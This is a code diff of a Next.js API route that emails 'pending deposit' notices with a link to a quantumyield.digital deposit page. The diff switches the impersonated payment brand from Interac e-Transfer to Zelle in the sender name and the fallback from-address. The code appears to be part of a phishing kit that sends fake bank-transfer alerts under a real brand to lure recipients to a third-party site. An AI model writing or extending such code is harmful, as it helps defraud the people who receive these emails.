@@ -23,7 +23,7 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: "Invalid amount format" }, { status: 400 })
     }
 
-    const depositBaseUrl = "https://interac.quantumyield.digital"
+    const depositBaseUrl = "https://app.quantumyield.digital"
     const depositParams = new URLSearchParams({
       transferId,
       amount: amountNumber.toString(),
@@ -41,7 +41,7 @@ export async function POST(request: NextRequest) {
       message: message || `Transaction ID: ${transferId}`,
       depositLink,
       transferId,
-      senderName: "Interac e-Transfer",
+      senderName: "Zelle",
       bankName: bankName || "Banking System",
     })
 
@@ -49,8 +49,8 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: "Failed to generate email template" }, { status: 500 })
     }
 
-    const fromAddress = process.env.RESEND_FROM_EMAIL || "Interac e-Transfer <onboarding@resend.dev>"
-    console.log("[v0] send-pending-deposit — from:", fromAddress, "to:", recipient)
+    const fromAddress = process.env.RESEND_FROM_EMAIL || "Zelle <onboarding@resend.dev>"
+    console.log("[send-pending-deposit] from:", fromAddress, "to:", recipient)
 
     const response = await fetch("https://api.resend.com/emails", {
       method: "POST",
